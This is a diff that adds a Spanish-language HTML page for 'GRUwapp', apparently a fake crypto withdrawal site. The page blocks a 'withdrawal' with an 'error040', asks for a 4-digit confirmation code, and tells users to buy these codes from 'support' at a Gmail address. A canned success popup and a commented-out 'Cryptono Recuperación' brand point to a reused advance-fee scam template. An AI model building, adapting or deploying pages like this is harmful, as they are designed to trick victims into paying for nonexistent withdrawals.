@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GRUwapp</title>
+  <link rel="stylesheet" href="/error.css">
+  <link rel="icon" href="/img/0f20ec6e326500c041b2a55c50c49bcc-removebg-preview.png">
+
+  <script src="https://kit.fontawesome.com/aa7454d09f.js" crossorigin="anonymous"></script>
+
+</head>
+<body>
+
+ 
+    <!-- Header -->
+    <header>
+      <div id="logo">
+          <a href="./index.html">
+            <img src="/img/0f20ec6e326500c041b2a55c50c49bcc-removebg-preview.png" alt="" style="width: 50px; transform: translateY(18px);">
+                   
+            <h1 style="color: #fff; padding-left: 50px; transform: translateY(-20px);"><span style="color: #16D5FF;">GRUwapp</span><span style="color: #16D5FF;"></span></h1>
+                    </a>
+      </div>
+      <ul class="nav" id="nav">
+          <ul class="navLogo">
+              <a href="./index.html">
+                   <!-- <img src="./img/logo-white.png" alt=""> -->
+                   <!-- <h1 style="color: #fff;"><span style="color: #3d51f2;">Cryptono</span> Recuperación<span style="color: #3d51f2;">.</span></h1> -->
+             </a>
+          </ul>
+
+          <li class="nav-link"><a href="/index.html">Home</a></li>
+          <li class="nav-link"><a href="">About</a></li>
+          <li class="nav-link"><a href="">Service</a></li>
+          <li class="nav-link"><a href="">Testimonial</a></li>
+          <li class="nav-link"><a href="">Pages</a></li>
+          <li class="nav-link"><a href="">Contact</a></li>
+          <li class="sociallinkContainer">
+              <img class="sociallink" src="./img/fabook-icon-white.svg" alt="">
+              <img class="sociallink" src="./img/twitter-icon-white.svg" alt="">
+              <img class="sociallink" src="./img/inkedin-icon-white.svg" alt="">
+              <img class="sociallink" src="./img/whatsapp-icon-white.svg" alt="">
+          </li>
+      </ul>
+      <div id="barContainer">
+          <i id="bar" class="fa-solid fa-bars"></i>
+      </div>
+  </header>
+
+
+
+
+<center>
+
+  
+  
+ <div class="contain">
+
+  <div class="col">
+
+    <p style="color: red;"> error040:</p>
+     <div class="inputBox">
+         <!-- <input type="text" placeholder=""> -->
+     </div>
+                         <p style="cursor: pointer;">No se puede proceder con el retiro Se requiere <span style="color: red; cursor: pointer;">un código de confirmación de 4 dígitos</span></p>
+
+
+
+                       <label for="inputField">Ingrese el código de 4 dígitos:</label> 
+    <!-- <h1>Enter the 4-Digit Code</h1> -->
+    <input type="password" id="codeInput" maxlength="4" placeholder="Enter code">
+    <button onclick="checkCode()">Proceder a retirar</button>
+  </div> 
+
+  
+
+  <!-- Success Popup -->
+  <div id="successPopup" class="popup">
+    <div class="popup-content">
+      <h2>Éxito!</h2>
+      <p>Procesamiento de transferencia.</p>
+      <button onclick="closePopup()">DE ACUERDO</button>
+    </div>
+  </div>
+
+  <p class="move">Puede contactar a cualquiera de nuestro equipo de soporte para comprar los códigos de confirmación para su retiro o cualquier otro agente.</p>
+
+  <a href="mailto:gruwappsoporte@gmail.com">gruwappsoporte@gmail.com</a>
+
+</center>
+
+
+  <script src="/js/valid.js"></script>
+</body>
+</html>
